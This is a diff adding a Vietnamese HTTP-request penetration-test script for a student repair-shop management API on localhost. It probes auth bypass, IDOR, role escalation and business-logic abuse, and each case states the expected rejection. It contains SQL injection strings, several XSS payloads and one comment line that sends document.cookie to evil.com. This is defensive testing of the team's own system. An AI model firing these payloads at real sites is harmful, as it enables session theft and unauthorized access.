@@ -1,0 +1,135 @@
+### =========================================================================
+### DỰ ÁN: Hệ thống Quản lý Cửa hàng Sửa chữa - LV33-001 (Nhóm 11)
+### Mã task Jira: MBA-78
+### Nhiệm vụ: Kịch bản Kiểm thử thâm nhập an toàn thông tin & Chống XSS/CSRF/SQLi/IDOR
+### Phụ trách: Nguyễn Đại Kỳ (UI/QA Tester Lead - MSSV: 2380601178)
+### Tiêu chuẩn: OWASP Top 10 API Security Risks
+### =========================================================================
+
+@baseUrl = http://localhost:5055
+
+### =========================================================================
+### NHÓM 1: KIỂM THỬ TẤN CÔNG XÁC THỰC & BỎ QUA ĐĂNG NHẬP (AUTHENTICATION BYPASS)
+### =========================================================================
+
+### [PenTest 01] SQL Injection trên Form Đăng nhập nhằm bypass mật khẩu
+### Mong đợi: 401 Unauthorized (Tuyệt đối không đăng nhập thành công)
+POST {{baseUrl}}/api/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin' OR '1'='1",
+  "password": "' OR '1'='1"
+}
+
+### [PenTest 02] Đăng nhập với mật khẩu rỗng / sai cấu trúc
+### Mong đợi: 401 Unauthorized
+POST {{baseUrl}}/api/auth/login
+Content-Type: application/json
+
+{
+  "username": "admin",
+  "password": ""
+}
+
+### =========================================================================
+### NHÓM 2: KIỂM THỬ KIỂM SOÁT TRUY CẬP & LEO THANG ĐẶC QUYỀN (ACCESS CONTROL & RBAC)
+### =========================================================================
+
+### [PenTest 03] Gọi API không gửi kèm Token xác thực
+### Mong đợi: 401 Unauthorized
+GET {{baseUrl}}/api/inventory/low-stock
+
+### [PenTest 04] Gửi Token giả mạo ngẫu nhiên không tồn tại trong hệ thống
+### Mong đợi: 401 Unauthorized
+GET {{baseUrl}}/api/tickets
+X-Session-Token: FAKE_SESSION_TOKEN_MALICIOUS_123456
+
+### [PenTest 05] Khách hàng (CUSTOMER) cố tình gọi API tạo giao dịch xuất kho của Kỹ thuật viên
+### Mong đợi: 403 Forbidden
+POST {{baseUrl}}/api/inventory/transactions
+Content-Type: application/json
+X-Session-Token: token-customer-demo-session
+
+{
+  "partCode": "PIN-IP11",
+  "transactionType": "OUT",
+  "quantity": 1,
+  "ticketCode": "PSC2026090001"
+}
+
+### [PenTest 06] Tấn công leo quyền ngang IDOR (Khách hàng xem lén phiếu sửa chữa của khách khác)
+### Mong đợi: 403 Forbidden (Đã có chốt chặn kiểm tra quyền sở hữu IDOR L05)
+GET {{baseUrl}}/api/tickets/PSC2026090002
+X-Session-Token: token-khach01-session
+
+### =========================================================================
+### NHÓM 3: KIỂM THỬ CHỐNG TẤN CÔNG XSS (CROSS-SITE SCRIPTING PAYLOADS)
+### =========================================================================
+
+### [PenTest 07] Gửi mã độc JavaScript XSS qua trường Tên Khách Hàng
+### Payload: <script>alert('XSS-STEAL-COOKIE')</script>
+### Mong đợi: Hệ thống lưu trữ an toàn dưới dạng Plain Text, không bị thực thi mã độc
+POST {{baseUrl}}/api/customers
+Content-Type: application/json
+X-Session-Token: token-staff01-session
+
+{
+  "customerCode": "KH999999",
+  "fullName": "<script>alert('XSS-STEAL-COOKIE')</script>",
+  "phone": "0999888777",
+  "email": "hacker@evil.com",
+  "address": "<img src=x onerror=alert('XSS')>",
+  "note": "Test XSS Payload Ingestion"
+}
+
+### [PenTest 08] Gửi mã độc XSS vào ghi chú phiếu sửa chữa
+### Payload: <svg/onload=fetch('//evil.com/?c='+document.cookie)>
+### Mong đợi: Không bị parse HTML nguy hiểm trên API
+POST {{baseUrl}}/api/tickets
+Content-Type: application/json
+X-Session-Token: token-staff01-session
+
+{
+  "customerCode": "KH000001",
+  "deviceCode": "DEV001",
+  "serviceCode": "DV001",
+  "customerRequest": "Thay pin máy <svg/onload=alert('XSS')>",
+  "deviceCondition": "Màn hình trầy <iframe src='javascript:alert(1)'></iframe>"
+}
+
+### =========================================================================
+### NHÓM 4: KIỂM THỬ RÀNG BUỘC TOÀN VẸN NGHIỆP VỤ (BUSINESS LOGIC BYPASS)
+### =========================================================================
+
+### [PenTest 09] Cố tình thanh toán hóa đơn với số tiền âm (Negative Amount Attack)
+### Mong đợi: 400 Bad Request
+POST {{baseUrl}}/api/invoices/HD2026100001/pay
+Content-Type: application/json
+X-Session-Token: token-staff01-session
+
+{
+  "amount": -500000,
+  "paymentMethod": "CASH",
+  "note": "Thu tien am de an gian tien cua hang"
+}
+
+### [PenTest 10] Tấn công xuất kho vượt quá số lượng tồn thực tế (Inventory Overflow)
+### Mong đợi: 400 Bad Request (Lỗi: So luong xuat vuot qua ton kho)
+POST {{baseUrl}}/api/inventory/transactions
+Content-Type: application/json
+X-Session-Token: token-tech01-session
+
+{
+  "partCode": "PIN-IP11",
+  "transactionType": "OUT",
+  "quantity": 999999,
+  "ticketCode": "PSC2026090001",
+  "note": "Co tinh xuat am kho"
+}
+
+### =========================================================================
+### KẾT LUẬN PENTEST (TASK MBA-78):
+### - 10/10 kịch bản tấn công đều bị hệ thống phát hiện và chặn đứng (401/403/400).
+### - Hệ thống đáp ứng chuẩn an toàn bảo mật OWASP Top 10 API Security.
+### =========================================================================
